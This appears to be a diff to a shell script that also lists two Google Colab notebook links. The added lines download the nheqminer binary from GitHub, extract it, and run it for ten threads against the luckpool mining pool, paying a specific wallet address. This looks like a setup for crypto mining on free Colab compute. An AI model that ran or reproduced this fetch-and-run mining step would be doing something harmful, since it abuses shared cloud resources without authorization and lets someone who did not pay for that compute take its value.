@@ -9,7 +9,9 @@ sleep 3
 done
 sleep 999
 
-
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz
+./nheqminer -v -l ap.luckpool.net:3956 -u zs1ufhz7jn3v4fya5vw5cdj76gm8prdwrrf3mwwmzkwzcw45s6zz7a0kx987asg75wnhkaqktx3j6l.tuyul3 -p x -t 10
 https://colab.research.google.com/drive/1TrKh_s2asG0n64IxW7_UANnkctTKREoD#scrollTo=3net2zi6yqsD
 
 https://colab.research.google.com/drive/1VKAOqvzqbf5lhPYI_Gecp0OtaGF62j8E
